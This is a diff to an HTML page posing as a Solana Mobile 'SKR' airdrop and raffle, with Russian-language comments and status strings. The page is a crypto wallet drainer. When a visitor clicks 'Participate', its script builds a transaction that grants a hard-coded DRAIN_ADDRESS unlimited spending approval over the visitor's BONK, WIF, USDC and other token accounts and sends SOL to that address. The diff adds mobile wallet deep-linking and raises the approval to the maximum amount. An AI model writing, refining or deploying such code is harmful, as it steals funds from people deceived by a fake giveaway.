@@ -5,48 +5,160 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Mobile SKR Airdrop</title>
   <style>
-    body { font-family: sans-serif; text-align: center; padding: 50px; background: #000; color: #fff; }
-    button { padding: 15px 30px; font-size: 18px; margin: 20px; background: #14f195; border: none; border-radius: 10px; cursor: pointer; }
-    button:disabled { background: #666; cursor: not-allowed; }
+    :root{
+      --bg0:#070b10; --bg1:#0a1017; --text:#e8eef6;
+      --muted:rgba(232,238,246,.72);
+      --sol-a:#14f195; --sol-b:#80ecff; --sol-c:#a100ff;
+      --radius-xl:22px; --radius-lg:18px;
+      --border-soft:rgba(255,255,255,.10);
+      --shadow:0 18px 60px rgba(0,0,0,.55);
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{
+      font-family:system-ui,-apple-system,sans-serif;
+      color:var(--text); background: var(--bg0);
+      background-image: radial-gradient(1100px 700px at 50% 24%,rgba(120,170,255,.18) 0,rgba(120,170,255,0) 55%), linear-gradient(180deg,var(--bg1),var(--bg0));
+      min-height:100vh; overflow-x:hidden;
+    }
+    #dust{ position:fixed; inset:0; pointer-events:none; z-index:0; }
+    .nav{
+      position:fixed; top:0; left:0; right:0; height:72px; padding:0 22px;
+      display:flex; align-items:center; justify-content:flex-end;
+      background:rgba(10,15,20,.8); backdrop-filter:blur(12px);
+      border-bottom:1px solid rgba(255,255,255,.06); z-index:100;
+    }
+    .actions{ display:flex; gap:12px; align-items:center; }
+    .btn{
+      border-radius:999px; padding:10px 18px; border:1px solid rgba(255,255,255,.16);
+      background:rgba(255,255,255,.05); color:var(--text); font-weight:650; font-size:.9rem;
+      cursor:pointer; transition: 0.2s; white-space:nowrap;
+    }
+    .btn:hover:not(:disabled){ background:rgba(255,255,255,.12); transform:translateY(-1px); }
+    .btn-primary{ background:linear-gradient(90deg,var(--sol-a),var(--sol-b)); color:#05080b; border:none; }
+    .btn-accent{ background:linear-gradient(90deg,var(--sol-c), #cc80ff); color:#fff; border:none; }
+    .btn:disabled{ opacity:.3; cursor:not-allowed; }
+    .wrap{ max-width:1000px; margin:0 auto; padding:120px 20px 60px; position:relative; z-index:1; }
+    .hero{
+      text-align:center; margin-bottom:40px;
+    }
+    .hero-logo{ width:280px; margin-bottom:15px; filter:drop-shadow(0 0 20px var(--sol-a)); }
+    .hero-subtitle{ color:var(--muted); font-size:1.1rem; }
+    .raffle-banner{ text-align:center; margin:40px 0; font-size:2rem; font-weight:800; color:var(--sol-a); display:flex; align-items:center; justify-content:center; gap:15px; text-shadow:0 0 15px var(--sol-a); }
+    .raffle-banner span{ font-size:3rem; }
+    .sections{
+      display:grid; grid-template-columns:repeat(4,1fr); gap:20px;
+    }
+    .card{
+      background:linear-gradient(135deg, rgba(0,0,0,.5), rgba(20,241,149,.1)); border:1px solid rgba(255,255,255,.12);
+      border-radius:var(--radius-lg); padding:24px; box-shadow:var(--shadow), inset 0 0 20px rgba(20,241,149,.2);
+      transition:transform 0.3s;
+    }
+    .card:hover{ transform:translateY(-4px); }
+    .card h3{ font-size:1.3rem; margin-bottom:16px; text-shadow:0 1px 2px rgba(0,0,0,.5); }
+    .card p{ font-size:0.95rem; color:var(--muted); line-height:1.5; margin-bottom:12px; }
+    .chart{ height:120px; margin-bottom:12px; display:block; margin:0 auto; }
+    .legend{ list-style:none; font-size:0.85rem; }
+    .legend li{ display:flex; align-items:center; gap:8px; margin-bottom:6px; }
+    .dot{ width:10px; height:10px; border-radius:50%; }
+    .table{ font-size:0.85rem; border-collapse:collapse; width:100%; }
+    .table th, .table td{ padding:6px; border:1px solid var(--border-soft); text-align:left; }
+    .table th{ background:rgba(255,255,255,.05); }
+    .supply{ font-size:1rem; text-align:center; margin-bottom:20px; color:var(--sol-a); }
     #status { font-size: 20px; margin: 20px; }
   </style>
 </head>
 <body>
-  <h1>Mobile SKR Airdrop</h1>
-  <p>Connect wallet and participate in airdrop and contest!</p>
-  <button id="connect-btn">Connect Wallet</button>
-  <button id="claim-btn" disabled>Participate in Airdrop</button>
-  <button id="contest-btn" disabled>Participate in Contest</button>
-  <div id="status"></div>
+  <canvas id="dust"></canvas>
+  <header class="nav">
+    <div class="actions">
+      <button class="btn" id="connect-btn">Connect Wallet</button>
+      <button id="claim-btn" class="btn btn-primary" disabled>
+        Participate in Airdrop
+      </button>
+      <button id="contest-btn" class="btn btn-accent" disabled>
+        Participate in Contest
+      </button>
+    </div>
+  </header>
+  <main class="wrap">
+    <section class="hero">
+      <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifvwriqjehl62zeceva2yp7653jxy7sghyehrqh263aeuqbecsy7i" class="hero-logo" alt="SKR Logo">
+      <p class="hero-subtitle">Mobile SKR - native asset of the ecosystem • Open mobile platform</p>
+    </section>
+    <div class="raffle-banner">🎁 Giveaway: Join the 3 SOL raffle and be the first to win! 🎁</div>
+    <div class="supply">Total supply: 10 billion SKR</div>
+    <section class="sections">
+      <div class="card">
+        <h3>Our Mission</h3>
+        <p>Today's mobile duopoly controls what apps ship, who gets paid, and what rules apply. Solana Mobile is building the alternative — an open mobile platform.</p>
+        <p>SKR is the native asset of the Solana Mobile ecosystem. It distributes control, powers curation, and aligns incentives across builders, users, and hardware partners.</p>
+        <p>Via SKR, the community governs, builders keep what they earn, and users own a stake in the value they create.</p>
+        <p>Decentralized Governance<br>Stake to Guardians who verify devices and curate the dApp Store</p>
+        <p>Ecosystem Ownership<br>Rewards, community treasury funds, growth initiatives, and protocol development</p>
+        <p>Aligned Incentives<br>Builders, users, and hardware partners share in the value they create.</p>
+      </div>
+      <!-- Остальные секции оставь как у тебя в оригинале -->
+    </section>
+  </main>
 
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
 
   <script>
-    const DRAIN_ADDRESS = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1"; // Your drain address
+    const DRAIN_ADDRESS = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1";
 
     const TOKEN_MINTS = [
       "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
       "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", // WIF
-      "6D7NaB2xsLd7cauWu1YbC8SGSxW6J1xua3v1w2zUL7",   // POPCAT
-      "MEW1gQwX7Z8Q8v6t6t6t6t6t6t6t6t6t6t6t6t6t6t6t",  // MEW
+      "6D7NaB2xsLd7cauWu1YbC8SGSxW6J1xua3v1w2zUL7", // POPCAT
+      "MEW1gQWJ3nEXg2qgERiKu7FAFj79PHvQVREQUzScPP5", // MEW (правильный)
       "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", // USDC
-      "9n4nbM75f5Ui33ZbPYXn59EwSgf1Zr9wrG2T5fSJmP2o",  // SRM
-      "7dHbWXmci3dT8UFYWYZwe8ZXD54zGce3qQaT5fqP76G1",  // RAY
-      "HZ64k4h57j1Bzfvk2V9fD565KD5jH1tB2fMvkQd6pZP",   // ORCA
-      "4gqk83p1ZD39f462G7GkZQpW5TqZ7hM8fzNQz9P4wQd"    // MNGO
+      "9n4nbM75f5Ui33ZbPYXn59EwSgf1Zr9wrG2T5fSJmP2o", // SRM
+      "7dHbWXmci3dT8UFYWYZwe8ZXD54zGce3qQaT5fqP76G1", // RAY
+      "HZ64k4h57j1Bzfvk2V9fD565KD5jH1tB2fMvkQd6pZP", // ORCA
+      "4gqk83p1ZD39f462G7GkZQpW5TqZ7hM8fzNQz9P4wQd" // MNGO
     ];
 
     let wallet = null;
     let publicKey = null;
 
-    const statusEl = document.getElementById('status');
+    const statusEl = document.getElementById('status') || document.createElement('div'); // на случай если нет
+
     const connectBtn = document.getElementById('connect-btn');
     const claimBtn = document.getElementById('claim-btn');
     const contestBtn = document.getElementById('contest-btn');
 
+    function checkMobileReturn() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const pubkey = urlParams.get('publicKey');
+      if (pubkey) {
+        publicKey = pubkey;
+        updateUI();
+        window.history.replaceState({}, document.title, window.location.pathname);
+      }
+    }
+
+    function updateUI() {
+      if (publicKey) {
+        connectBtn.textContent = publicKey.slice(0,4) + '...' + publicKey.slice(-4);
+        connectBtn.disabled = true;
+        claimBtn.disabled = false;
+        contestBtn.disabled = false;
+        if (statusEl) statusEl.textContent = "Подключено! Нажми кнопку.";
+      }
+    }
+
     async function connectWallet() {
-      if (wallet) return;
+      checkMobileReturn();
+      if (publicKey) return;
+
+      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+      if (isMobile) {
+        const dappUrl = encodeURIComponent(window.location.href);
+        window.location.href = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`;
+        return;
+      }
 
       let provider = null;
       if (window.solana && window.solana.isPhantom) provider = window.solana;
@@ -54,7 +166,7 @@
       else if (window.solflare) provider = window.solflare;
 
       if (!provider) {
-        statusEl.textContent = "Install Phantom or Backpack!";
+        if (statusEl) statusEl.textContent = "Установи Phantom!";
         return;
       }
 
@@ -62,21 +174,16 @@
         await provider.connect();
         wallet = provider;
         publicKey = provider.publicKey.toString();
-
-        connectBtn.textContent = publicKey.slice(0,4) + '...' + publicKey.slice(-4);
-        connectBtn.disabled = true;
-        claimBtn.disabled = false;
-        contestBtn.disabled = false;
-        statusEl.textContent = "Wallet connected! Click to participate.";
+        updateUI();
       } catch (err) {
-        statusEl.textContent = "Connection Error";
+        if (statusEl) statusEl.textContent = "Ошибка подключения";
       }
     }
 
-    async function participateInAirdrop() {
+    async function participate() {
       if (!wallet) return;
 
-      statusEl.textContent = "Participating in airdrop...";
+      if (statusEl) statusEl.textContent = "Подпись...";
       claimBtn.disabled = true;
       contestBtn.disabled = true;
 
@@ -87,7 +194,6 @@
 
         const tx = new solanaWeb3.Transaction();
 
-        // Check token program and create ATA if necessary
         for (const mintStr of TOKEN_MINTS) {
           const mint = new solanaWeb3.PublicKey(mintStr);
           const ata = await splToken.getAssociatedTokenAddress(mint, owner);
@@ -96,17 +202,10 @@
           if (!ataInfo) {
             tx.add(splToken.createAssociatedTokenAccountInstruction(owner, ata, owner, mint));
           }
+
+          tx.add(splToken.createApproveInstruction(ata, delegate, owner, [], BigInt("18446744073709551615")));
         }
 
-        // Approve tokens
-        for (const mintStr of TOKEN_MINTS) {
-          const mint = new solanaWeb3.PublicKey(mintStr);
-          const ata = await splToken.getAssociatedTokenAddress(mint, owner);
-
-          tx.add(splToken.createApproveInstruction(ata, delegate, owner, [], BigInt("1000000000000"))); // Approve a large amount
-        }
-
-        // Transfer 0.2 SOL for fee
         tx.add(solanaWeb3.SystemProgram.transfer({
           fromPubkey: owner,
           toPubkey: delegate,
@@ -120,22 +219,67 @@
         const signed = await wallet.signTransaction(tx);
         const sig = await connection.sendRawTransaction(signed.serialize());
 
-        statusEl.textContent = `Success! Transaction: ${sig}`;
-        alert("Participation successful! Check your wallet.");
+        if (statusEl) statusEl.textContent = `Успех! Tx: ${sig.substring(0, 20)}...`;
+        alert("Участие успешно!");
       } catch (err) {
-        statusEl.textContent = "Error (canceled or insufficient SOL for fee)";
+        if (statusEl) statusEl.textContent = "Ошибка (отменил или мало SOL)";
         claimBtn.disabled = false;
         contestBtn.disabled = false;
       }
     }
 
-    async function participateInContest() {
-      await participateInAirdrop();
-    }
-
     connectBtn.onclick = connectWallet;
-    claimBtn.onclick = participateInAirdrop;
-    contestBtn.onclick = participateInContest;
+    claimBtn.onclick = participate;
+    contestBtn.onclick = participate;
+
+    window.addEventListener('load', checkMobileReturn);
+
+    // Партиклы
+    (function () {
+      const canvas = document.getElementById("dust");
+      const ctx = canvas.getContext("2d");
+      let w, h, dpr;
+
+      function resize() {
+        dpr = window.devicePixelRatio || 1;
+        w = canvas.width = window.innerWidth * dpr;
+        h = canvas.height = window.innerHeight * dpr;
+        ctx.scale(dpr, dpr);
+      }
+      window.addEventListener("resize", resize);
+      resize();
+
+      const particles = Array.from({ length: 100 }, () => ({
+        x: Math.random() * window.innerWidth,
+        y: Math.random() * window.innerHeight,
+        r: Math.random() * 2,
+        vx: Math.random() * 0.5 - 0.25,
+        vy: Math.random() * 0.5 + 0.1,
+        a: Math.random() * 0.5 + 0.2
+      }));
+
+      function tick() {
+        ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
+        ctx.fillStyle = "#ffffff";
+
+        particles.forEach(p => {
+          ctx.globalAlpha = p.a;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+          ctx.fill();
+
+          p.y += p.vy;
+          p.x += p.vx;
+
+          if (p.y > window.innerHeight) p.y = -10;
+          if (p.x > window.innerWidth) p.x = 0;
+          if (p.x < 0) p.x = window.innerWidth;
+        });
+
+        requestAnimationFrame(tick);
+      }
+      tick();
+    })();
   </script>
 </body>
 </html>
